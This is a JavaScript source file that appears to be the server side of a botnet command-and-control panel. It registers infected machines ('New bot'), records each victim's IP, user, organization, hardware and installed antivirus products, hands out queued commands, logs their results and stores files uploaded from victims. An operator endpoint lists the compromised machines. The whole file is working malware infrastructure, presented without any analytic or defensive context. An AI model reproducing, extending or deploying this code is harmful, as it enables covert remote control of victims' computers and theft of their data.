const
    db = require('./database.js'),
    chalk = require('chalk');

const
    error = chalk.redBright('ERROR'),
    warning = chalk.keyword('orange')('WARN'),
    info = chalk.cyan('INFO');

function parseAV(names, states){
    var tmp = [];
    if(names.length == 1)
        if(names[0] == undefined) return null;
    for(var i = 0; i<names.length; i++){
        tmp.push({
            $: {state: states[i]},
            _: names[i]
        });
    }
    return tmp.length>0 ? tmp : null;
}

exports.getCommands = function(req, res){
    if(db.isBlacklisted(req.get('User'))){
        res.send(db.builder.buildObject({
            commands: {}
        }));
        //console.log(warning, req.get('User'), 'was denied commands.');
        return;
    }
    let bot = db.findBot(req.get('User'));
    db.updateLastSeen(req.get('User'));
    let cmds = {};
    if(bot){
        cmds = bot.commands;
    } else {
        cmds = {cmd:[{$:{id:0,type:'Register'}}]};
    }
    res.send(db.builder.buildObject({
        commands: cmds
    }));
};

exports.postResults = function(req, res){
    if(db.isBlacklisted(req.get('User'))){
        res.send('Thanks.');
        //console.log(warning, req.get('User'), 'was denied results.');
        return;
    }
    if(req.body.CommandID == 0){
        if(!Array.isArray(req.body.displayName)){
            req.body.displayName = [req.body.displayName];
            req.body.productState = [req.body.productState];
        }
        let av = parseAV(req.body.displayName, req.body.productState);
        let newBot = {
            id: req.get('User'),
            name: req.get('Name'),
            ip: req.body.IP,
            system: {
                name: req.body.CSName,
                user: req.body.RegisteredUser,
                org: req.body.Organization,
                os: {
                    name: req.body.Caption,
                    bit: req.body.OSArchitecture,
                    install: req.body.InstallDate
                },
                ram: req.body.TotalVisibleMemorySize,
                cpu: {
                    name: req.body.Name?.[1],
                    cores: req.body.NumberOfCores
                },
                gpu: req.body.Name?.[0]
            },
            defense: av ? {av} : {},
            commands: {},
            log: {},
            last: Date.now()
        };
        db.addBot(newBot);
        console.log(info, chalk.green('New bot --> '+req.get('Name')));
    } else if (req.body.Result == 'Uninstall initiated.') {
        if(db.deleteBot(req.get('User'))){
            console.log(info, chalk.redBright('Uninstall --> '+req.get('Name')));
        }   
    } else {
        let bot = db.findBot(req.get('User'));
        if(bot){
            let c = db.findCommandIndex(bot, req.body.CommandID);
            if(c>-1){
                if(req.body.Result)
                    db.addLog(bot, req.body.CommandID, req.body.Result);
                if(req.body.Last == 'True'){
                    db.removeCommand(bot, c);
                    console.log(info, req.get('Name'), ' --> Result');
                } else console.log(info, req.get('Name'), ' --> Log');
            }
        }        
    }
    res.send('Thanks.');
};

exports.uploadFile = function(req, res){
    if(req.files){
        if(req.files.file){
            let tmp = req.files.file;
            let name = req.files.file.name;
            if(req.body.CommandID){
                name = req.body.CommandID + '_' + name;
            }
            tmp.mv('Files\\' + name, function(e){
                if(e) console.log(warning, 'File upload of', name, 'failed.\n\t', e);
            });
            res.send('Thanks for the file.');
        } else {
            res.send('Invalid file.');
        } 
    } else {
        res.send('Invalid file.');
    }
};

exports.getBots = function(req, res){
    if(!req.session.user){
        res.status(401).send('You are not logged in.');
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        console.log(warning, ip, 'attempted to get the list of bots without logging in.');
    } else {
        let tmp = Object.keys(db.List).reduce((object, key) => {
            if (!['commands', 'log'].includes(key)) {
              object[key] = db.List[key]
            }
            return object
        }, {});
        let tmp1 = {
            uptime: db.uptime(),
            users: db.getUserCount(),
            active: {a: db.Stats}
        }
        res.send(db.builder.buildObject({
            root: {
                bots: tmp,
                stats: tmp1
            }
        }));
    }
}